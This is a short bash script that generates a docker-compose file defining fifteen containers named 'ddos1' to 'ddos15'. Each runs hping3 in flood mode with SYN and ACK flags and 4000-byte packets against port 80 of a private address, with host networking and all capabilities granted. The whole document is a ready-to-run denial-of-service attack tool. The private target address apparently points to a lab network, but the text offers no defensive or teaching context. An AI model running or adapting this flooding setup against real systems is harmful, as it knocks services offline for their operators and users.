#!/bin/bash
cat > docker-compose.yml <<EOF
version: "3"
services: 
$(for c in {1..15}
do
cat <<EOC
    ddos$c:
        image: sflow/hping3:latest
        network_mode: host
        stdin_open: true
        tty: true
        entrypoint: ["hping3", "172.19.0.207", "-p", "80", "-S", "-A", "--flood", "-d", "4000"]
        cap_add:
        - ALL
EOC
done
)
EOF
